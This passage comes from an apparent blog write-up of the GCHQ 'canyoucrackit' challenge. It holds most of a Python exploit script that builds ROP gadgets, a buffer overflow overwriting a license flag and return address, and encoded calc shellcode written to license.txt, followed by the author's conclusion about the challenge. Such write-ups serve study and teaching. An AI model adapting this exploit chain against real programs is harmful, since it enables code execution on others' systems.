+</span><span class="n">pop_edi</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x67\x15\x11\x61</span><span class="s">'</span>
+<span class="c1"># pop esi | pop edi | pop ebp | retn
+</span><span class="n">pop_sdb</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xef\x8e\x06\x61</span><span class="s">'</span>
+
+<span class="c1"># == memory patch
+# 0x6111459f :  # MOV DWORD PTR DS:[EAX],ESI # MOV EAX,EDI # POP EBX # POP ESI # POP EDI # POP EBP # RETN
+</span><span class="n">patch_at_eax</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x9f\x45\x11\x61</span><span class="s">'</span>
+
+<span class="c1"># == stack pivots
+# add esp, 8 | retn
+</span><span class="n">add_esp8</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x4a\xb8\x02\x61</span><span class="s">'</span>
+
+<span class="c1"># == registry related
+# 0x6113f7e3 :  # MOV EDX,EAX # MOV EAX,EDX # RETN
+</span><span class="n">mov_da</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xe3\xf7\x13\x61</span><span class="s">'</span>
+<span class="c1"># 0x6113f7e5 :  # MOV EAX,EDX # RETN
+</span><span class="n">mov_ad</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xe5\xf7\x13\x61</span><span class="s">'</span>
+<span class="c1"># xchg eax, ecx
+</span><span class="n">xchg_ac</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x7b\x6f\x09\x61</span><span class="s">'</span>
+<span class="c1"># xchg eax, edx
+</span><span class="n">xchg_ad</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x5a\xf0\x09\x61</span><span class="s">'</span>
+<span class="c1"># call eax
+</span><span class="n">jmp_eax</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x9b\x9d\x13\x61</span><span class="s">'</span> <span class="c1"># 0x61139d9b
+</span>
+<span class="c1"># gadget(s) from executable
+# ret
+</span><span class="n">ret</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x86\x10\x40\x00</span><span class="s">'</span>
+
+
+<span class="s">''' Exploit Section '''</span>
+
+<span class="n">junk1</span> <span class="o">=</span> <span class="n">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mi">44</span>
+<span class="n">hasLicense</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x01\x00\x00\x00</span><span class="s">'</span> <span class="c1"># hasLicense
+</span><span class="n">junk2</span> <span class="o">=</span> <span class="n">b</span><span class="s">'b'</span> <span class="o">*</span> <span class="mi">12</span>
+<span class="c1"># pop | retn
+</span><span class="n">seip</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xa3\x14\x40\x00</span><span class="s">'</span>  <span class="c1"># eip
+</span><span class="n">sebp</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x00\x02\x40\x00</span><span class="s">'</span>  <span class="c1"># ebp
+</span>
+<span class="c1"># == rop chain: recover esp in eax
+# pop esi # junk # junk # retn
+</span><span class="n">prepare_regs</span> <span class="o">=</span> <span class="n">pop_sdb</span> <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">b</span><span class="s">'junk'</span> <span class="o">*</span> <span class="mi">2</span>
+<span class="c1"># pop edi # pop ebp # retn
+</span><span class="n">prepare_regs</span> <span class="o">+=</span> <span class="n">pop_edi</span> <span class="o">+</span> <span class="n">pop_eax</span> <span class="o">+</span> <span class="n">pop_eax</span>
+<span class="c1"># pop ebx
+</span><span class="n">prepare_regs</span> <span class="o">+=</span> <span class="n">pop_ebx</span> <span class="o">+</span> <span class="n">add_esp8</span>
+<span class="c1"># pop eax
+</span><span class="n">prepare_regs</span> <span class="o">+=</span> <span class="n">pop_eax</span> <span class="o">+</span> <span class="n">jmp_eax</span>
+<span class="c1">#
+</span><span class="n">rop_get_eax</span> <span class="o">=</span> <span class="n">prepare_regs</span> <span class="o">+</span> <span class="n">pushad</span>
+
+<span class="c1"># our whole rop chain, i did not include VirtualProtect payload btw
+# it is equivalent to mov eax, esp | jmp eax
+</span><span class="n">rop_chain</span> <span class="o">=</span> <span class="n">junk1</span> <span class="o">+</span> <span class="n">hasLicense</span> <span class="o">+</span> <span class="n">junk2</span> <span class="o">+</span> <span class="n">seip</span> <span class="o">+</span> <span class="n">sebp</span> <span class="o">+</span> <span class="n">rop_get_eax</span>
+
+<span class="c1"># we have the following rop chain for prepare_regs
+</span><span class="s">'''
+|    pop esi     |
+|   0x90 * 4     |  esi
+|     junk       |
+|     junk       |
+|    pop edi     |
+| addr(jmp_eax)  |  edi
+| addr(jmp_eax)  |  ebp
+|    pop ebx     |
+| addr(add_esp8) |  ebx
+|    pop eax     |
+| addr(jmp_eax)  |  eax
+'''</span>
+
+<span class="c1"># we have the following stack after the pushad
+</span><span class="s">'''
+|   pop eax   |     edi
+|  0x90 * 4   |     esi
+|   pop eax   |     ebp
+|     esp     |     esp
+| add esp + 8 |     ebx
+|    junk     |     edx
+|    junk     |     ecx
+|   jmp eax   |     eax
+'''</span>
+
+<span class="c1"># the registers after the execution of the constructed ropchain
+</span><span class="s">'''
+eax = esp
+ebx = addr(add_esp8)
+ecx = ecx
+edx = edx
+edi = addr(pop_eax)
+esi = 0x90909090
+ebp = addr(pop_eax)
+esp = esp
+'''</span>
+
+<span class="c1"># now our payload
+# our payload will be a calc here
+</span><span class="n">calc</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xda\xd5\xd9\x74\x24\xf4\x5b\xba\xf3\x21\x03\x70\x31\xc9</span><span class="s">'</span>      \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\xb1\x33\x83\xeb\xfc\x31\x53\x13\x03\xa0\x32\xe1\x85\xba</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\xdd\x6c\x65\x42\x1e\x0f\xef\xa7\x2f\x1d\x8b\xac\x02\x91</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\xdf\xe0\xae\x5a\x8d\x10\x24\x2e\x1a\x17\x8d\x85\x7c\x16</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x0e\x28\x41\xf4\xcc\x2a\x3d\x06\x01\x8d\x7c\xc9\x54\xcc</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\xb9\x37\x96\x9c\x12\x3c\x05\x31\x16\x00\x96\x30\xf8\x0f</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\xa6\x4a\x7d\xcf\x53\xe1\x7c\x1f\xcb\x7e\x36\x87\x67\xd8</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\xe7\xb6\xa4\x3a\xdb\xf1\xc1\x89\xaf\x00\x00\xc0\x50\x33</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x6c\x8f\x6e\xfc\x61\xd1\xb7\x3a\x9a\xa4\xc3\x39\x27\xbf</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x17\x40\xf3\x4a\x8a\xe2\x70\xec\x6e\x13\x54\x6b\xe4\x1f</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x11\xff\xa2\x03\xa4\x2c\xd9\x3f\x2d\xd3\x0e\xb6\x75\xf0</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x8a\x93\x2e\x99\x8b\x79\x80\xa6\xcc\x25\x7d\x03\x86\xc7</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x6a\x35\xc5\x8d\x6d\xb7\x73\xe8\x6e\xc7\x7b\x5a\x07\xf6</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\xf0\x35\x50\x07\xd3\x72\xae\x4d\x7e\xd2\x27\x08\xea\x67</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x2a\xab\xc0\xab\x53\x28\xe1\x53\xa0\x30\x80\x56\xec\xf6</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x78\x2a\x7d\x93\x7e\x99\x7e\xb6\x1c\x7c\xed\x5a\xcd\x1b</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x95\xf9\x11</span><span class="s">'</span><span class="p">;</span>
+
+<span class="n">egg</span> <span class="o">=</span> <span class="n">rop_chain</span> <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">+</span> <span class="n">calc</span>
+
+<span class="c1"># write our sploit file :)
+</span><span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"license.txt"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
+<span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">egg</span><span class="p">)</span>
+<span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>So as you can see this is a direct ret overwrite, it bypass the “hasLicense” but it fails to gethostbyname() because we overwrite the hostname ;).</p>
+
+<p>For a security challenge … well it was not secure :).</p>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>The challenges were accessible by anyone with some programming knowledge and basic reversing skills.</p>
+
+<p>I am not British so I did it for “fun” … but for those who applied for the job: they clearly are not searching for highly skilled reverser or programmers … just the average would do I think here.
+Otherwise they would have put more protections on the executables, etc.</p>
+
+<p>I am quite disappointed for an entity such as GCHQ as the challenges were “phony” …
+It  was more about searching in the right place than anything else … but well.</p>
+
+<p>Anyway, I see no point in applying for such an offer:</p>
+
+<ul>
+  <li>you can’t speak about your jobs (=&gt; Official Secrets Act)</li>
+  <li>you can’t speak about your colleagues (=&gt; Official Secrets Act)</li>
+  <li>you pay is too low</li>
+  <li>you have more risks of being attacked/killed/retained as an hostage (=&gt; in order to potentially attack and steal information from the UK Secret Service)</li>
+  <li>if you quit GCHQ, you are stuck with a CV with a “blank” hole</li>
+  <li>etc
+I might be wrong … but well I do not see any advantages.</li>
+</ul>
+
+<p>Anyway, hope you had fun through this serie,</p>
+
+<p>m_101</p>
+
+<h1 id="resources">Resources</h1>
+
+<ul>
+  <li>My solutions: <a href="http://www.mediafire.com/?6hej4szvrqyll6j">here</a> or <a href="/assets/others/gchq.zip">here</a></li>
+</ul>
+
+
+  </div>
+
+  <div class="post-navigation">
+    
+    <a class="post-prev" href="/binholic/2011/12/03/gchq-challenge-part-2.html">Previous : GCHQ Challenge Part 2 - http://www.canyoucrackit.co.uk/</a>
+    
+
+    
+    <a class="post-next" href="/binholic/2011/12/05/crashfr-nest-plus.html">Next : CrashFr n'est plus :(.</a>
+    
+  </div>
+
+  
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function () {
+            this.page.url = "http://binholic.com/binholic/2011/12/03/gchq-challenge-part-3.html";
+            this.page.identifier = "/binholic/2011/12/03/gchq-challenge-part-3";
+        };
+
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+
+            s.src = '//binholic.disqus.com/embed.js';
+
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+  
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+      <div class="site-footer">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/m101"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/w_levin"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="mailto:m101.sec@gmail.com"><span class="icon icon--email"><?xml version="1.0" encoding="UTF-8"?>
+<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="240.665px" height="250px" viewBox="43.833 205.167 240.665 250" enable-background="new 43.833 205.167 240.665 250" xml:space="preserve">
+<g>
+	<path fill="#323232" d="M221.459,396.62c-8.84,0-15.904-2.21-21.191-6.63c-5.289-4.42-8.449-10.441-9.488-18.07   c-4.855,5.895-10.66,10.965-17.42,15.21c-6.762,4.249-14.561,6.37-23.4,6.37c-6.59,0-12.83-1.256-18.72-3.77   c-5.895-2.512-11.095-6.15-15.6-10.92c-4.509-4.766-8.105-10.571-10.79-17.42c-2.689-6.846-4.03-14.69-4.03-23.531   c0-9.879,1.56-19.064,4.68-27.56c3.12-8.49,7.365-15.86,12.74-22.1c5.371-6.24,11.7-11.136,18.98-14.69   c7.28-3.551,15.08-5.33,23.4-5.33c9.01,0,16.68,1.82,23.01,5.461c6.324,3.639,11.311,8.234,14.949,13.779l2.34-17.42h20.541   l-10.66,85.02c-0.52,3.99-0.781,7.021-0.781,9.101c0,5.029,1.041,8.929,3.121,11.7c2.08,2.774,5.545,4.16,10.4,4.16   c4.504,0,8.84-1.646,13-4.94c4.16-3.29,7.799-7.931,10.92-13.91c3.119-5.979,5.589-13.085,7.41-21.319   c1.82-8.23,2.729-17.291,2.729-27.17c0-11.961-2.123-23.051-6.369-33.281c-4.25-10.225-10.228-19.064-17.939-26.52   c-7.715-7.451-16.859-13.26-27.43-17.42c-10.576-4.16-22.189-6.24-34.842-6.24c-16.119,0-30.464,3.165-43.029,9.49   c-12.57,6.33-23.14,14.605-31.72,24.83c-8.58,10.229-15.08,21.799-19.5,34.71c-4.42,12.915-6.63,26.045-6.63,39.39   c0,15.08,2.34,28.516,7.02,40.301c4.68,11.789,11.18,21.795,19.5,30.029c8.32,8.23,18.11,14.471,29.38,18.721   c11.265,4.244,23.485,6.369,36.661,6.369c13.17,0,24.914-1.561,35.229-4.68c10.311-3.121,20.15-6.936,29.512-11.439l7.539,19.76   c-9.016,4.85-19.891,8.924-32.631,12.219c-12.738,3.291-26.479,4.941-41.209,4.941c-16.64,0-31.98-2.516-46.02-7.541   c-14.04-5.029-26.175-12.439-36.4-22.23c-10.229-9.795-18.2-21.84-23.92-36.139c-5.72-14.301-8.58-30.811-8.58-49.53   c0-17.331,2.99-33.841,8.97-49.53c5.98-15.686,14.471-29.51,25.48-41.47c11.005-11.96,24.266-21.45,39.78-28.47   c15.51-7.02,32.889-10.53,52.129-10.53c16.291,0,31.156,2.645,44.59,7.93c13.432,5.29,24.916,12.524,34.451,21.71   c9.529,9.189,16.898,20.064,22.1,32.63c5.199,12.568,7.799,26.129,7.799,40.689c0,12.48-1.518,23.965-4.549,34.45   c-3.035,10.489-7.195,19.5-12.48,27.04c-5.289,7.54-11.615,13.391-18.98,17.55C238.139,394.54,230.124,396.62,221.459,396.62z    M156.979,374.26c6.76,0,13-1.86,18.721-5.59c5.719-3.725,10.311-7.756,13.779-12.09l6.24-51.48   c-3.469-5.545-7.975-10.051-13.52-13.52c-5.551-3.465-11.875-5.2-18.98-5.2c-5.201,0-10.23,1.17-15.08,3.511   c-4.855,2.34-9.145,5.635-12.87,9.879c-3.729,4.25-6.675,9.32-8.84,15.211c-2.169,5.895-3.25,12.395-3.25,19.5   c0,13.174,3.291,23.1,9.88,29.77C139.645,370.925,147.62,374.26,156.979,374.26z"/>
+</g>
+</svg></span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="http://127.0.0.1:8888/USK@ABR8mm2t1L1G8cBG70cDy4PHFO6LPV~LrA-RIZxgOGI,pnGWUxb7k8~5-ywwqnBakTXx5ZFw6QzzZj7H~45NgE8,AQACAAE/binholic/-1/"><span class="icon icon--freenet"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!-- Created with Inkscape (http://www.inkscape.org/) -->
+<svg
+   xmlns:svg="http://www.w3.org/2000/svg"
+   xmlns="http://www.w3.org/2000/svg"
+   version="1.0"
+   width="79.12"
+   height="52.64">
+  <defs/>
+  <g
+     transform="translate(-47.495719,-111.30691)">
+    <path
+       d="M 80.03,122.66 C 94.49,107.06 104.32,113.99 87.53,124.89 C 82.19,128.36 83.58,129.37 87.17,128.82 C 92.24,128.05 95.01,129.02 96.24,129.98 C 99.18,132.28 100.65,130.57 101.64,128.82 C 103.61,125.35 110.25,129.12 105.39,132.75 C 101.59,135.58 102.12,138.77 105.57,140.61 C 111.96,144.01 126.30,150.75 124.14,157.93 C 123.26,160.86 121.67,163.62 118.07,159.89 C 111.32,152.92 106.83,146.97 91.28,144.54 C 81.24,142.96 71.15,140.33 61.46,145.25 C 56.90,147.67 51.16,149.23 49.94,146.37 C 48.35,142.64 56.47,139.57 64.32,138.82 C 69.42,138.33 73.99,134.99 67.00,133.29 C 58.39,130.64 68.28,123.09 74.50,124.89 C 78.55,126.07 78.95,123.83 80.03,122.66 z"
+       style="fill:#ffffff;stroke:#356ace;stroke-width:1.5;" />
+  </g>
+</svg>
+</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
